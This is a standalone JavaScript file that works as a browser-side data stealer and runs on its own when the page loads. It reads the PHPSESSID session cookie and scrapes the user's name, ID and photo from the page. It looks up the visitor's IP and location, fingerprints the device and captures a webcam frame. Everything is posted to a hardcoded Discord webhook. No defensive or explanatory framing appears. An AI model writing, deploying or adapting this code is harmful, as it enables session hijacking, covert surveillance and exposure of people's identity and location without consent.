async function urlToB64(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) { return 'No image' }
        const blob = await response.blob();
        if(blob.size < 1) { return 'No image' }

        return blob
    } catch (error) {
        return new Blob()
    }
}

function getSession() {
}

function GetUserDetails() {
    var userDetails = {};
    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name == 'PHPSESSID') {userDetails['PHPSESSID'] = value; }
    });

    // Get user details
    userDetails['user-pic'] = document.querySelector('.user-pic > img:nth-child(1)') ? document.querySelector('.user-pic > img:nth-child(1)').src : "Unavailable"
    userDetails['user-name'] = document.querySelector('.user-name > strong:nth-child(1)') ? document.querySelector('.user-name > strong:nth-child(1)').innerHTML : "Unavailable"
    userDetails['user-id'] = document.querySelector('.user-role') ? document.querySelector('.user-role').innerHTML : "Unavailable"

    return userDetails
}

// Get public IP and location information from ipinfo.io
async function getPublicIPInfo() {
    var location = null;
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            location = [pos.coords.latitude, pos.coords.longitude];
        });
    } else {
        location = 'Permission Denied'
    };

    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return {
            "Public IP": data.ip,
            "City": data.city,
            "Region": data.region,
            "Country": data.country,
            "ISP Location": data.loc,
            "Organization": data.org,
            "Postal Code": data.postal,
            "Timezone": data.timezone,
            "Real Location": location
        };
    } catch (error) {
        console.error('Error fetching public IP info:', error);
        return {
            "Public IP": "Unavailable",
            "City": "Unavailable",
            "Region": "Unavailable",
            "Country": "Unavailable",
            "Location (Coordinates)": "Unavailable",
            "Organization": "Unavailable",
            "Postal Code": "Unavailable",
            "Timezone": "Unavailable",
            "Real Location": location
        };
    }
}

// Get detailed device information
function getDeviceInfo() {
    const info = {
        "DateTime": new Date().toLocaleString().replace(',', ' -'),
        "Operating System": navigator.platform,
        "Browser": navigator.userAgent,
        "Language": navigator.language,
        "Screen Resolution": `${window.screen.width}x${window.screen.height}`,
        "Color Depth": `${window.screen.colorDepth}-bit`,
        "Device Pixel Ratio": window.devicePixelRatio,
        "Viewport Size": `${window.innerWidth}x${window.innerHeight}`,
        "Connection Type": navigator.connection ? navigator.connection.effectiveType : 'Unknown',
        "CPU Cores": navigator.hardwareConcurrency || 'Unknown',
        "Memory": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        "Cookies Enabled": navigator.cookieEnabled ? 'Yes' : 'No',
        "Do Not Track": navigator.doNotTrack ? 'Enabled' : 'Disabled',
        "Touch Support": 'ontouchstart' in window ? 'Yes' : 'No',
        "Local Storage": typeof(Storage) !== "undefined" ? 'Available' : 'Not Available',
        "Time Zone": Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    return info
}

async function captureFrameToBase64() {
    try {
        // Request access to the user's camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        // Create a video element to stream the video
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        // Wait for the video to start playing
        await new Promise((resolve) => (video.onloadedmetadata = resolve));

        // Create a canvas element to capture the frame
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop the video stream
        stream.getTracks().forEach((track) => track.stop());

        // Convert the canvas content to a blob
        const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));

        return blob;
    } catch (error) {
        console.error("Error capturing frame:", error);
        return new Blob()
    }
}


async function sendMessageToDiscord(device, _public, sess, camera, profile) {
    const webhookURL = 'https://discord.com/api/webhooks/1305384099841708115/Os4cTuTor643INFznkpJLcCeNCSRog1dUC3ANtLxLgUJUs3TJqWn9TjyB11XlLQXX0Iy';
    const formData = new FormData();
    const deviceInfo = JSON.stringify(device).slice(1, -1).replaceAll(',', ',\n').replaceAll(':', ': ').replaceAll('"', '');
    const publicInfo = JSON.stringify(_public).slice(1, -1).replaceAll(',', ',\n').replaceAll(':', ': ').replaceAll('"', '');
    
    const embed = [{
        title: sess['user-name'] + " - " + sess['user-id'] + "\n" + sess['PHPSESSID'],
        color: Math.round(Math.random() * 0xFFFFFF),
        author: { "name": device['DateTime']},
        fields: [
            {
                name: "Device Info",
                value: deviceInfo
            },
            {
                name: "Public Information",
                value: publicInfo
            }
        ],
        image: { url: camera ? 'attachment://camera.png' : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLLzweWCGj9LVROBgujLSPNTYIzSJ44AJMww&s' },
        thumbnail: { url: profile ? 'attachment://profile.png' : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLLzweWCGj9LVROBgujLSPNTYIzSJ44AJMww&s' }
    }]
    
    var i = 0
    if (camera) {
        formData.append(`file[${i}]`, camera, 'camera.png');
        i++;
    }

    if (profile) {
        formData.append(`file[${i}]`, profile, 'profile.png');
    }
    formData.append('payload_json', JSON.stringify({
        embeds: embed
    }));

    await fetch(webhookURL, {
        method: 'POST',
        body: formData
    });
}

(async _ => {
    const sess = GetUserDetails();
    const camFrame = await captureFrameToBase64()
    sendMessageToDiscord(
        getDeviceInfo(),
        await getPublicIPInfo(),
        sess,
        (camFrame.size < 1) ? camFrame : null,
        (sess['user-pic'] != "Unavailable" || urlToB64(sess['user-pic']).size < 1) ? await urlToB64(sess['user-pic']) : null
    )
})()